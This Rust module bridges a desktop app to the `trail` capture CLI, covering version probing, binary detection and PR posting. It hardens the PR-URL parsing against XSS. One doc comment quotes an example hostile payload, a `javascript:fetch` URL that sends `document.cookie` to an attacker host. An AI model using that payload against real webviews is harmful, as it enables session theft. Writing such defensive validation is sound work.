//! CLI bridge — typed subprocess invocation of the `trail` binary (gh#11
//! criterion 11; gh#12 Sprint 5). The binary is installed by
//! `npm install -g @synapti/trail-capture` (see that package's `bin` field).
//!
//! Sprint 4's decisions go through the in-Rust saga (B5 §3.1); the CLI
//! bridge is the mechanism for invoking the capture binary for:
//!
//!   - `version`: probe the installed capture CLI's version so the UI
//!     can warn on a schema-version mismatch (B5 §6.6).
//!   - `packet post`: Sprint 5 (gh#12 AC-3, AC-4) — invoke Phase 3b's
//!     `trail packet post` to sync the packet to a GitHub PR body.
//!   - `packet decide`: Sprint 5 (gh#12 AC-4) — reviewer J9 loop
//!     closure via `trail packet decide`.
//!
//! The bridge spawns the binary with argv (no shell-string interp),
//! a long timeout for network-bound operations (300s for post/decide,
//! 30s for version probe), and validates stderr keywords for E5 + E6
//! edge-flow detection. The post/decide commands are interactive by
//! default; the bridge always passes `--yes` to skip the confirm prompt
//! (the M4 modal performs the destination confirmation in-app per B6
//! P1 hardening, so the CLI's interactive prompt is bypassed).
//!
//! `capture_cli_path` from settings.json (B5 §6.6) is the path; default
//! is `trail` (resolved via PATH; the user can override to a local
//! `node_modules/.bin/trail` or an absolute path).

use regex::Regex;
use serde::{Deserialize, Serialize};
use std::path::Path;
use std::process::{Child, Command, Stdio};
use std::sync::OnceLock;
use std::time::{Duration, Instant};
use thiserror::Error;
use tracing::warn;

/// Anchored GitHub PR URL regex (v0.1.1 B1: XSS hardening).
///
/// The capture CLI's stderr is parsed into `pr_url` and rendered by
/// `PacketView.tsx` as `<a href={postToast.pr_url}>`. A compromised or
/// PATH-hijacked `trail` binary could emit
/// `posted packet to javascript:fetch('https://attacker/exfil?'+document.cookie)`
/// — a single click on the post-success toast would execute script inside
/// the webview (the CSP at `tauri.conf.json` does NOT block `javascript:`
/// hrefs). Anchor + structural check refuses anything that doesn't look
/// like a real `https://github.com/<owner>/<repo>/pull/<N>` URL at the
/// Rust boundary so the renderer never sees a hostile string. Mirrored
/// by `postToPrResponseSchema.pr_url` regex on the JS side.
fn github_pr_url_regex() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(
            r"^https://github\.com/[A-Za-z0-9._-]+/[A-Za-z0-9._-]+/pull/[1-9][0-9]*(?:/|\?[^\s]*)?$",
        )
        .expect("github_pr_url_regex compiles")
    })
}

fn is_github_pr_url(s: &str) -> bool {
    !s.is_empty() && s.len() <= 512 && github_pr_url_regex().is_match(s)
}

#[derive(Debug, Error)]
pub enum BridgeError {
    #[error("spawn failed: {0}")]
    Spawn(String),
    #[error("timeout after {0:?}")]
    Timeout(Duration),
    #[error("non-zero exit ({code}): {stderr}")]
    NonZeroExit { code: i32, stderr: String },
    #[error("invalid stdout: {0}")]
    InvalidStdout(String),
}

impl BridgeError {
    /// Stable kebab-case discriminant used in the IPC error payload so the
    /// frontend can branch on the failure shape (display "binary not found"
    /// vs. "version probe timed out" vs. etc.) without parsing the message.
    pub fn kind(&self) -> &'static str {
        match self {
            BridgeError::Spawn(_) => "spawn",
            BridgeError::Timeout(_) => "timeout",
            BridgeError::NonZeroExit { .. } => "non-zero-exit",
            BridgeError::InvalidStdout(_) => "invalid-stdout",
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct CaptureVersion {
    /// e.g., "0.1.0-dev"
    pub version: String,
}

/// Spawn `<bin> --version` and parse the stdout. The capture CLI prints
/// the version string verbatim (commander.js convention), so we collect
/// the first line and trim whitespace.
///
/// Per gh#11 criterion 11 + 13 (no mocks): this IS the real subprocess
/// invocation — there is no fallback to py-reference because Phase 1's
/// `trail` binary is on main. If the binary is missing, return
/// `Spawn("...")` and the UI surfaces the error.
///
/// gh#17: production callers (Settings → Capture Verify, settings.json
/// validation) now route through [`probe_capture_version_with_augmented_path`]
/// so the macOS GUI-PATH bug is fixed by default. This baseline variant
/// remains for tests (it isolates the await/parse loop from the PATH
/// augmentation logic) and as a public API for future callers that
/// explicitly want the inherited environment.
#[allow(dead_code)]
pub fn probe_capture_version(bin: &str) -> Result<CaptureVersion, BridgeError> {
    let child = Command::new(bin)
        .args(["--version"])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| BridgeError::Spawn(format!("{bin}: {e}")))?;
    await_version_probe(child, VERSION_PROBE_TIMEOUT)
}

/// Default timeout for `--version` probes. 30s is generous for what should
/// be a sub-100ms operation but accommodates first-run node/npm startup on
/// cold filesystems.
const VERSION_PROBE_TIMEOUT: Duration = Duration::from_secs(30);

/// PATH augmentations applied by [`probe_capture_version_with_augmented_path`]
/// and [`detect_capture_cli`] (gh#17).
///
/// macOS GUI-PATH bug: a GUI-launched app inherits a minimal PATH
/// (`/usr/bin:/bin:/usr/sbin:/sbin`) that does NOT include Homebrew or npm
/// global bin dirs. An npm-installed `trail` whose shebang is
/// `#!/usr/bin/env node` then can't find node at `/opt/homebrew/bin/node`
/// and `env` exits 127. Prepending the standard install locations to PATH
/// makes the env-shebang resolve without requiring the user to symlink
/// node into `/usr/local/bin`.
///
/// $HOME-prefixed entries are expanded at call time via
/// [`build_augmented_path`].
const PATH_AUGMENTATIONS: &[&str] = &[
    "/opt/homebrew/bin",
    "/usr/local/bin",
    "$HOME/.npm-global/bin",
    "$HOME/.local/bin",
];

/// Build a PATH string with [`PATH_AUGMENTATIONS`] prepended to the
/// inherited PATH. Augmentations win for the env-shebang lookup (the bug
/// we're fixing — `env node` resolution against GUI-inherited PATH); the
/// inherited PATH is retained as the suffix so the user's interactive
/// configuration is not silently overridden for tools that aren't in the
/// augmentation list.
fn build_augmented_path() -> String {
    let inherited = std::env::var("PATH").unwrap_or_default();
    let home = std::env::var("HOME").ok();
    let mut parts: Vec<String> = Vec::with_capacity(PATH_AUGMENTATIONS.len() + 1);
    for entry in PATH_AUGMENTATIONS {
        if let Some(rest) = entry.strip_prefix("$HOME") {
            if let Some(home_dir) = home.as_deref() {
                parts.push(format!("{home_dir}{rest}"));
            }
        } else {
            parts.push((*entry).to_string());
        }
    }
    if !inherited.is_empty() {
        parts.push(inherited);
    }
    parts.join(":")
}

/// Run the wait + parse loop for a `--version` probe child process.
/// Shared by [`probe_capture_version`] and
/// [`probe_capture_version_with_augmented_path`] so the two probes agree
/// on timeout semantics, exit-code handling, and empty-stdout treatment.
fn await_version_probe(
    mut child: Child,
    timeout: Duration,
) -> Result<CaptureVersion, BridgeError> {
    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let output = child
                    .wait_with_output()
                    .map_err(|e| BridgeError::Spawn(format!("wait_with_output: {e}")))?;
                if !status.success() {
                    return Err(BridgeError::NonZeroExit {
                        code: status.code().unwrap_or(-1),
                        stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
                    });
                }
                let stdout = String::from_utf8_lossy(&output.stdout);
                let line = stdout.lines().next().unwrap_or("").trim();
                if line.is_empty() {
                    return Err(BridgeError::InvalidStdout(
                        "empty stdout from --version".into(),
                    ));
                }
                return Ok(CaptureVersion {
                    version: line.to_string(),
                });
            }
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    return Err(BridgeError::Timeout(timeout));
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(e) => {
                return Err(BridgeError::Spawn(format!("try_wait: {e}")));
            }
        }
    }
}

/// gh#17 AC#3: variant of [`probe_capture_version`] that spawns with the
/// inherited PATH augmented by [`PATH_AUGMENTATIONS`]. Use this when the
/// probed binary may itself need to resolve dependencies via PATH —
/// notably the npm-installed `trail` script whose `#!/usr/bin/env node`
/// shebang fails under macOS GUI-PATH without augmentation.
pub fn probe_capture_version_with_augmented_path(
    bin: &str,
) -> Result<CaptureVersion, BridgeError> {
    let augmented_path = build_augmented_path();
    let child = Command::new(bin)
        .args(["--version"])
        .env("PATH", &augmented_path)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| BridgeError::Spawn(format!("{bin}: {e}")))?;
    await_version_probe(child, VERSION_PROBE_TIMEOUT)
}

// ---------------------------------------------------------------------------
// gh#17 — auto-detect capture CLI (AC#1, AC#2)
// ---------------------------------------------------------------------------
//
// Probe order (AC#2):
//   (a) login-shell — spawn `zsh -ic 'command -v trail'`, then bash, with
//       bounded 5s timeout. Picks up users whose interactive PATH is
//       configured in .zshrc / .bashrc.
//   (b) candidate paths — /opt/homebrew/bin/trail, /usr/local/bin/trail,
//       $HOME/.npm-global/bin/trail, $HOME/.local/bin/trail. Catches the
//       common npm install locations even when the login shell can't be
//       interrogated.
//   (c) marker file — read ~/.trail/last-run.json if present, use any
//       `cli_path` field. Best-effort: requires CLI cooperation (a
//       follow-up issue tracks the CLI writing the marker).
//
// First success wins. The `--version` probe is always
// [`probe_capture_version_with_augmented_path`] so the env-shebang lookup
// for `env node` works under macOS GUI-PATH.

/// Bounded timeout for the login-shell probe step. A non-responsive
/// interactive shell (fish prompt waiting for input, slow .zshrc network
/// mount) must not block detection.
const LOGIN_SHELL_PROBE_TIMEOUT: Duration = Duration::from_secs(5);

/// Successful detection outcome. Returned by [`detect_capture_cli`].
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DetectSuccess {
    /// Absolute path to the detected `trail` binary (or whatever the
    /// login-shell `command -v` resolved — typically absolute).
    pub path: String,
    /// `--version` output (first line, trimmed).
    pub version: String,
    /// Which probe strategy located the binary. Useful for telemetry +
    /// the UI's "detected at /path via login shell" copy.
    pub source: DetectSource,
}

/// Which probe strategy produced the detection.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum DetectSource {
    /// Resolved via `zsh -ic 'command -v trail'` (or bash fallback).
    LoginShell,
    /// Found at one of the well-known npm install locations.
    Candidate,
    /// Read from `~/.trail/last-run.json`'s `cli_path` field.
    MarkerFile,
}

impl DetectSource {
    /// Stable kebab-case discriminant. Used by tests + parity guards;
    /// the IPC payload itself goes through serde's `rename_all = "kebab-case"`
    /// derive, so this method is intentionally not called from the
    /// production binary path.
    #[allow(dead_code)]
    pub fn as_str(&self) -> &'static str {
        match self {
            DetectSource::LoginShell => "login-shell",
            DetectSource::Candidate => "candidate",
            DetectSource::MarkerFile => "marker-file",
        }
    }
}

/// Detection failure with a classified kind and a user-actionable fix.
/// Returned by [`detect_capture_cli`] when no probe strategy succeeds.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct DetectFailure {
    pub kind: DetectFailureKind,
    /// Human-readable description of what failed. Surfaced verbatim in
    /// the UI's failure card.
    pub message: String,
    /// Actionable next step (install command, symlink command, etc.).
    /// Surfaced with a copy-to-clipboard affordance when the text reads
    /// like a command.
    pub suggested_fix: String,
}

/// Classified failure mode. The UI's failure card switches on this
/// discriminant to render the right help copy (per AC#5).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum DetectFailureKind {
    /// No `trail` binary found via any probe strategy.
    BinaryNotInstalled,
    /// Binary found, but exec failed with `env: node: No such file` (exit
    /// 127). The macOS GUI-PATH bug — most common failure mode on
    /// Tauri-launched apps when augmented PATH still doesn't help.
    NodeMissing,
    /// Probe exceeded [`VERSION_PROBE_TIMEOUT`].
    ProbeTimedOut,
    /// Any other non-zero exit / spawn error / invalid stdout.
    ProbeError,
}

impl DetectFailureKind {
    /// Stable kebab-case discriminant — see [`DetectSource::as_str`] for
    /// the rationale on why this is not called from the production path.
    #[allow(dead_code)]
    pub fn as_str(&self) -> &'static str {
        match self {
            DetectFailureKind::BinaryNotInstalled => "binary-not-installed",
            DetectFailureKind::NodeMissing => "node-missing",
            DetectFailureKind::ProbeTimedOut => "probe-timed-out",
            DetectFailureKind::ProbeError => "probe-error",
        }
    }
}

/// Configuration for [`detect_capture_cli_with_config`]. Production
/// callers use [`DetectConfig::default`]; tests override individual
/// fields to inject deterministic candidate paths, marker files, and to
/// skip the login-shell probe (which is unmockable at this layer).
pub struct DetectConfig {
    /// Absolute paths to probe in order after the login shell. Each
    /// path is checked for existence + executability before invoking
    /// the version probe.
    pub candidate_paths: Vec<String>,
    /// When true, skips strategy (a) — useful for tests that don't want
    /// to depend on the host's login shell behavior.
    pub skip_login_shell: bool,
    /// Path to a marker file holding a JSON `{ "cli_path": "..." }`
    /// hint. When `None`, the marker-file strategy is skipped.
    pub marker_file: Option<std::path::PathBuf>,
}

impl Default for DetectConfig {
    fn default() -> Self {
        let home = std::env::var("HOME").ok();
        let candidate_paths: Vec<String> = PATH_AUGMENTATIONS
            .iter()
            .filter_map(|entry| {
                if let Some(rest) = entry.strip_prefix("$HOME") {
                    home.as_deref().map(|h| format!("{h}{rest}/trail"))
                } else {
                    Some(format!("{entry}/trail"))
                }
            })
            .collect();
        let marker_file = home
            .as_deref()
            .map(|h| std::path::PathBuf::from(format!("{h}/.trail/last-run.json")));
        Self {
            candidate_paths,
            skip_login_shell: false,
            marker_file,
        }
    }
}

/// Detect the `trail` CLI binary on this machine. Production entry
/// point: uses [`DetectConfig::default`] which probes the standard npm
/// install locations on macOS / Linux.
pub fn detect_capture_cli() -> Result<DetectSuccess, DetectFailure> {
    detect_capture_cli_with_config(&DetectConfig::default())
}

/// Configurable detection — same logic as [`detect_capture_cli`] but
/// takes an explicit [`DetectConfig`] for tests + future callers that
/// want to override candidate paths, skip the login shell, or point at
/// a different marker file.
pub fn detect_capture_cli_with_config(
    cfg: &DetectConfig,
) -> Result<DetectSuccess, DetectFailure> {
    let mut last_error: Option<BridgeError> = None;

    // Strategy (a): login shell.
    if !cfg.skip_login_shell {
        if let Some(shell_path) = probe_login_shell_for_trail() {
            match probe_capture_version_with_augmented_path(&shell_path) {
                Ok(v) => {
                    return Ok(DetectSuccess {
                        path: shell_path,
                        version: v.version,
                        source: DetectSource::LoginShell,
                    });
                }
                Err(e) => last_error = Some(e),
            }
        }
    }

    // Strategy (b): candidate paths.
    for candidate in &cfg.candidate_paths {
        if !Path::new(candidate).exists() {
            continue;
        }
        match probe_capture_version_with_augmented_path(candidate) {
            Ok(v) => {
                return Ok(DetectSuccess {
                    path: candidate.clone(),
                    version: v.version,
                    source: DetectSource::Candidate,
                });
            }
            Err(e) => last_error = Some(e),
        }
    }

    // Strategy (c): marker file.
    if let Some(marker) = &cfg.marker_file {
        if let Some(marker_cli_path) = read_marker_cli_path(marker) {
            match probe_capture_version_with_augmented_path(&marker_cli_path) {
                Ok(v) => {
                    return Ok(DetectSuccess {
                        path: marker_cli_path,
                        version: v.version,
                        source: DetectSource::MarkerFile,
                    });
                }
                Err(e) => last_error = Some(e),
            }
        }
    }

    Err(classify_detect_failure(last_error))
}

/// Run `zsh -ic 'command -v trail'`, then `bash -ic 'command -v trail'`
/// as fallback. Returns the resolved path on success, `None` if neither
/// shell exists, both time out, or the binary is not on the user's
/// interactive PATH. Bounded by [`LOGIN_SHELL_PROBE_TIMEOUT`] per shell.
fn probe_login_shell_for_trail() -> Option<String> {
    for shell in &["zsh", "bash"] {
        if let Some(path) = probe_one_login_shell(shell) {
            return Some(path);
        }
    }
    None
}

fn probe_one_login_shell(shell: &str) -> Option<String> {
    let mut child = Command::new(shell)
        .args(["-ic", "command -v trail"])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .ok()?;
    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let output = child.wait_with_output().ok()?;
                if !status.success() {
                    return None;
                }
                let path = String::from_utf8_lossy(&output.stdout)
                    .lines()
                    .next()
                    .unwrap_or("")
                    .trim()
                    .to_string();
                if path.is_empty() || !Path::new(&path).exists() {
                    return None;
                }
                return Some(path);
            }
            Ok(None) => {
                if start.elapsed() > LOGIN_SHELL_PROBE_TIMEOUT {
                    let _ = child.kill();
                    return None;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(_) => return None,
        }
    }
}

/// Parse a marker file written by the CLI on its last successful run.
/// Schema: `{ "cli_path": "/absolute/path/to/trail" }`. Returns the
/// path if the file exists, parses, and points at an existing file.
/// All failure cases return `None` — this is best-effort.
fn read_marker_cli_path(path: &Path) -> Option<String> {
    if !path.exists() {
        return None;
    }
    let bytes = std::fs::read(path).ok()?;
    let parsed: serde_json::Value = serde_json::from_slice(&bytes).ok()?;
    let cli_path = parsed.get("cli_path")?.as_str()?.trim();
    if cli_path.is_empty() || !Path::new(cli_path).exists() {
        return None;
    }
    Some(cli_path.to_string())
}

/// Convert the last-seen [`BridgeError`] (if any) into a classified
/// [`DetectFailure`] with user-actionable copy.
fn classify_detect_failure(last_error: Option<BridgeError>) -> DetectFailure {
    match last_error {
        None => DetectFailure {
            kind: DetectFailureKind::BinaryNotInstalled,
            message: "Could not find a `trail` binary on PATH or at standard install \
locations (/opt/homebrew/bin, /usr/local/bin, ~/.npm-global/bin, ~/.local/bin)."
                .to_string(),
            suggested_fix:
                "Install with: npm install -g @synapti/trail-capture".to_string(),
        },
        Some(BridgeError::NonZeroExit { code: 127, stderr })
            if is_env_node_missing(&stderr) =>
        {
            DetectFailure {
                kind: DetectFailureKind::NodeMissing,
                message:
                    "Found `trail` but `env` could not locate `node` (exit 127). On macOS, \
GUI-launched apps inherit a minimal PATH that does not include where Homebrew \
installs node."
                    .to_string(),
                suggested_fix:
                    "Symlink node into the system PATH: sudo ln -s /opt/homebrew/bin/node \
/usr/local/bin/node  —  or relaunch Trail from a terminal so the full PATH is \
inherited."
                    .to_string(),
            }
        }
        Some(BridgeError::Timeout(_)) => DetectFailure {
            kind: DetectFailureKind::ProbeTimedOut,
            message: "Probing the `trail` binary did not return in time.".to_string(),
            suggested_fix: "Re-run Detect. If it keeps timing out, set the path manually in \
Settings."
                .to_string(),
        },
        Some(BridgeError::NonZeroExit { code, stderr }) => DetectFailure {
            kind: DetectFailureKind::ProbeError,
            message: format!(
                "Probe exited with code {code}: {}",
                stderr.lines().next().unwrap_or("(no stderr)").trim()
            ),
            suggested_fix:
                "Check that the binary at the configured path is executable and prints its \
version on --version."
                    .to_string(),
        },
        Some(BridgeError::Spawn(msg)) => DetectFailure {
            kind: DetectFailureKind::BinaryNotInstalled,
            message: format!("Could not spawn binary: {msg}"),
            suggested_fix:
                "Install with: npm install -g @synapti/trail-capture".to_string(),
        },
        Some(BridgeError::InvalidStdout(msg)) => DetectFailure {
            kind: DetectFailureKind::ProbeError,
            message: format!("Probe returned unexpected output: {msg}"),
            suggested_fix:
                "Check that the binary at the configured path is a valid Trail CLI."
                    .to_string(),
        },
    }
}

/// Match the `env: node: No such file or directory` stderr that the npm
/// `trail` script emits when its shebang `#!/usr/bin/env node` cannot
/// resolve node. Pattern is conservative: requires the literal "env:"
/// prefix AND a "node" mention AND a "No such file" tail.
fn is_env_node_missing(stderr: &str) -> bool {
    let lc = stderr.to_lowercase();
    lc.contains("env:") && lc.contains("node") && lc.contains("no such file")
}

// ---------------------------------------------------------------------------
// Sprint 5 — `trail packet post` + `trail packet decide` subprocess invokers.
// ---------------------------------------------------------------------------
//
// These are the cli_bridge wrappers around Phase 3b's CLI surface. They
// do NOT re-implement gh API logic — Phase 3b (`apps/capture/src/post/`,
// `apps/capture/src/decide/`) owns that contract. The bridge merely:
//
//   1. Spawns the capture CLI with the right argv (always `--yes` —
//      the M4 modal performs destination confirmation in-app per B6 P1).
//   2. Captures stdout + stderr.
//   3. Maps the CLI's structured exit code (per Phase 3b's exit-codes.ts)
//      to a kebab-case `kind` for the UI's edge-flow Banner switch.
//
// The post/decide CLIs run subprocesses themselves (gh CLI for the actual
// network egress); the timeout here covers the entire chain so a hung gh
// auth flow or stalled HTTP request surfaces eventually rather than
// freezing the IPC indefinitely.

/// Phase 3b CLI exit codes (mirror of `apps/capture/src/exit-codes.ts`).
/// Centralised here so the kind mapping in `classify_packet_op_failure`
/// is auditable from one place.
const EXIT_OK: i32 = 0;
const EXIT_GENERIC: i32 = 1;
const EXIT_PACKET_NOT_FOUND: i32 = 2; // alias of EXIT_TRANSCRIPT_NOT_FOUND
const EXIT_AUTH: i32 = 3; // alias of EXIT_GIT_STATE
const EXIT_GH_MISSING: i32 = 4; // alias of EXIT_PATTERNS
const EXIT_VALIDATION: i32 = 5;
const EXIT_WRITE: i32 = 6;
const EXIT_NETWORK_OR_RATE_LIMIT: i32 = 7; // alias of EXIT_LLM_STRICT — both per cv-2
const EXIT_INVALID_ARGS: i32 = 8;
const EXIT_PR_NOT_FOUND: i32 = 9; // alias of EXIT_CONCURRENT

/// Stable kebab-case discriminant for packet-op (post/decide) failures.
/// Frontend Banner kinds branch on this verbatim. `kind()` mirrors the
/// pattern from Phase 3b's `GhErrorKind` so the UI's E1-E7 switch is one
/// match arm per kind.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PacketOpErrorKind {
    /// gh CLI not authenticated (E3 / E5 — gh auth expired).
    Auth,
    /// gh CLI not installed (E4 — `gh` absent on PATH).
    GhMissing,
    /// PR not found (distinct error per AC-7).
    PrNotFound,
    /// Network failure (E6) or rate-limit (403/429) — share exit 7 per cv-2;
    /// the message text disambiguates for the user.
    NetworkOrRateLimit,
    /// Packet YAML missing on disk (E1 corrupt-packet substitute when the
    /// packet path itself does not exist — distinct from parse-error).
    PacketNotFound,
    /// Schema validation failed (E1 — corrupt packet, schema mismatch).
    Validation,
    /// Local write failure (atomic-write rollback after PR landed).
    Write,
    /// User-supplied invalid arguments — programming error in the IPC
    /// caller; surfaces as `invalid-arguments` IpcError up-stack.
    InvalidArgs,
    /// Subprocess could not be spawned (E4 — capture CLI absent).
    Spawn,
    /// Timeout — the post/decide chain did not complete in N seconds.
    Timeout,
    /// Anything Phase 3b reports that we cannot map cleanly. Surfaces as
    /// a generic Banner with the raw stderr.
    Other,
}

impl PacketOpErrorKind {
    /// Stable kebab-case discriminant for the IPC payload.
    pub fn as_str(&self) -> &'static str {
        match self {
            PacketOpErrorKind::Auth => "auth",
            PacketOpErrorKind::GhMissing => "gh-missing",
            PacketOpErrorKind::PrNotFound => "pr-not-found",
            PacketOpErrorKind::NetworkOrRateLimit => "network-or-rate-limit",
            PacketOpErrorKind::PacketNotFound => "packet-not-found",
            PacketOpErrorKind::Validation => "validation",
            PacketOpErrorKind::Write => "write",
            PacketOpErrorKind::InvalidArgs => "invalid-args",
            PacketOpErrorKind::Spawn => "spawn",
            PacketOpErrorKind::Timeout => "timeout",
            PacketOpErrorKind::Other => "other",
        }
    }
}

/// Result of a successful `trail packet post` invocation. Phase 3b's
/// stderr emits `posted packet to <url> (body_hash <prefix>...)` on
/// success — we parse that line so the UI can display the PR URL +
/// body_hash prefix in the M4 confirmation toast.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PacketPostOutcome {
    pub pr_url: String,
    pub body_hash_prefix: String,
    /// Destination "owner/name#PR" — also emitted on stderr by Phase 3b
    /// post step 4 ("Posting to <dest> (<url>)"). The M4 modal already
    /// shows this pre-post; we surface it post-success too as confirm.
    pub destination: String,
}

/// Result of a successful `trail packet decide`. The CLI emits
/// `decision recorded: <claim> <decision>; comment + body posted to <url>`
/// on success.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct PacketDecideOutcome {
    pub pr_url: String,
    pub claim_id: String,
    pub decision: String,
}

/// Failure from a packet-op subprocess. `stderr` carries the full CLI
/// stderr for Banner display; `kind` is the discriminant.
#[derive(Debug, Clone, Error)]
#[error("packet op failed (kind={kind:?}, exit={exit_code:?}): {stderr}")]
pub struct PacketOpError {
    pub kind: PacketOpErrorKind,
    pub stderr: String,
    pub exit_code: Option<i32>,
}

/// Map a (exit code, stderr) pair into a `PacketOpErrorKind`. Phase 3b's
/// CLI exit code is the primary signal; we fall back to keyword matching
/// on stderr for the few classes where exit codes alias (e.g. exit 7 =
/// network OR rate-limit; we always map to NetworkOrRateLimit but a
/// future enhancement could disambiguate).
fn classify_packet_op_failure(exit_code: i32, stderr: &str) -> PacketOpErrorKind {
    match exit_code {
        EXIT_OK => PacketOpErrorKind::Other, // shouldn't happen on the failure path
        EXIT_AUTH => PacketOpErrorKind::Auth,
        EXIT_GH_MISSING => PacketOpErrorKind::GhMissing,
        EXIT_PR_NOT_FOUND => PacketOpErrorKind::PrNotFound,
        EXIT_NETWORK_OR_RATE_LIMIT => PacketOpErrorKind::NetworkOrRateLimit,
        EXIT_PACKET_NOT_FOUND => PacketOpErrorKind::PacketNotFound,
        EXIT_VALIDATION => PacketOpErrorKind::Validation,
        EXIT_WRITE => PacketOpErrorKind::Write,
        EXIT_INVALID_ARGS => PacketOpErrorKind::InvalidArgs,
        EXIT_GENERIC => {
            // Phase 3b uses exit 1 as the generic catch-all; keyword-sniff
            // stderr to refine where possible. This complements the exit
            // code so a CLI that prints "no such file" but exits 1
            // surfaces as PacketNotFound rather than Other.
            let lower = stderr.to_lowercase();
            if lower.contains("packet not found") || lower.contains("no such file") {
                PacketOpErrorKind::PacketNotFound
            } else {
                PacketOpErrorKind::Other
            }
        }
        _ => PacketOpErrorKind::Other,
    }
}

/// Parse Phase 3b's success-line stderr. The post CLI emits:
///   `Posting to owner/name#PR (https://github.com/...)`
///   `posted packet to <url> (body_hash <16hex>...)`
/// and the decide CLI emits:
///   `decision recorded: <claim> <decision>; comment + body posted to <url>`
fn parse_post_outcome(stderr: &str) -> Option<PacketPostOutcome> {
    let mut destination = String::new();
    let mut pr_url = String::new();
    let mut body_hash_prefix = String::new();
    for line in stderr.lines() {
        if let Some(rest) = line.strip_prefix("Posting to ") {
            // "<owner>/<name>#<N> (<url>)"
            if let Some(open) = rest.find(" (") {
                destination = rest[..open].trim().to_string();
            } else {
                destination = rest.trim().to_string();
            }
        } else if let Some(rest) = line.strip_prefix("posted packet to ") {
            // "<url> (body_hash <prefix>…)"
            if let Some(open) = rest.find(" (body_hash ") {
                pr_url = rest[..open].trim().to_string();
                let after = &rest[open + " (body_hash ".len()..];
                if let Some(close) = after.find(|c: char| c == '\u{2026}' || c == ')') {
                    body_hash_prefix = after[..close].trim().to_string();
                }
            } else {
                pr_url = rest.trim().to_string();
            }
        }
    }
    // v0.1.1 B1: refuse anything that doesn't look like a real GitHub PR
    // URL at the Rust boundary. A compromised capture CLI emitting
    // `posted packet to javascript:...` must not become a clickable
    // <a href> in PacketView. The TS contract's pr_url regex is the
    // belt-and-braces second check.
    if !is_github_pr_url(&pr_url) {
        warn!(
            "parse_post_outcome: rejected non-GitHub-PR url shape (len={})",
            pr_url.len()
        );
        return None;
    }
    Some(PacketPostOutcome {
        pr_url,
        body_hash_prefix,
        destination,
    })
}

fn parse_decide_outcome(stderr: &str) -> Option<PacketDecideOutcome> {
    for line in stderr.lines() {
        if let Some(rest) = line.strip_prefix("decision recorded: ") {
            // "<claim> <decision>; comment + body posted to <url>"
            let semi = rest.find(';')?;
            let head = rest[..semi].trim();
            let mut head_parts = head.splitn(2, ' ');
            let claim_id = head_parts.next()?.trim().to_string();
            let decision = head_parts.next()?.trim().to_string();
            let tail = &rest[semi + 1..];
            let url_marker = "posted to ";
            let url_idx = tail.find(url_marker)?;
            let pr_url = tail[url_idx + url_marker.len()..].trim().to_string();
            // v0.1.1 B1: same XSS-hardening as parse_post_outcome — refuse
            // non-GitHub-PR shapes at the Rust boundary so a hostile capture
            // CLI cannot land a `javascript:` href in the decision toast.
            if !is_github_pr_url(&pr_url) {
                warn!(
                    "parse_decide_outcome: rejected non-GitHub-PR url shape (len={})",
                    pr_url.len()
                );
                return None;
            }
            return Some(PacketDecideOutcome {
                pr_url,
                claim_id,
                decision,
            });
        }
    }
    None
}

/// Spawn a subprocess with argv, wait up to `timeout`, return stdout,
/// stderr, and exit status. Generic primitive that the post/decide
/// invokers compose. NEVER uses shell-string interp (no shell injection).
fn spawn_with_timeout(
    bin: &str,
    args: &[&str],
    timeout: Duration,
) -> Result<(String, String, std::process::ExitStatus), BridgeError> {
    let mut child = Command::new(bin)
        .args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| BridgeError::Spawn(format!("{bin}: {e}")))?;

    let start = Instant::now();
    loop {
        match child.try_wait() {
            Ok(Some(status)) => {
                let output = child
                    .wait_with_output()
                    .map_err(|e| BridgeError::Spawn(format!("wait_with_output: {e}")))?;
                return Ok((
                    String::from_utf8_lossy(&output.stdout).into_owned(),
                    String::from_utf8_lossy(&output.stderr).into_owned(),
                    status,
                ));
            }
            Ok(None) => {
                if start.elapsed() > timeout {
                    let _ = child.kill();
                    return Err(BridgeError::Timeout(timeout));
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(e) => return Err(BridgeError::Spawn(format!("try_wait: {e}"))),
        }
    }
}

/// Convert a generic `BridgeError` from the subprocess primitive into a
/// `PacketOpError`. Spawn failure → `Spawn`; timeout → `Timeout`;
/// non-zero exit → classified by exit code + stderr.
fn bridge_to_packet_err(err: BridgeError, stderr_so_far: String) -> PacketOpError {
    match err {
        BridgeError::Spawn(msg) => PacketOpError {
            kind: PacketOpErrorKind::Spawn,
            stderr: msg,
            exit_code: None,
        },
        BridgeError::Timeout(_) => PacketOpError {
            kind: PacketOpErrorKind::Timeout,
            stderr: stderr_so_far,
            exit_code: None,
        },
        BridgeError::NonZeroExit { code, stderr } => PacketOpError {
            kind: classify_packet_op_failure(code, &stderr),
            stderr,
            exit_code: Some(code),
        },
        BridgeError::InvalidStdout(msg) => PacketOpError {
            kind: PacketOpErrorKind::Other,
            stderr: msg,
            exit_code: None,
        },
    }
}

/// Default timeout for `trail packet post` + `trail packet decide`.
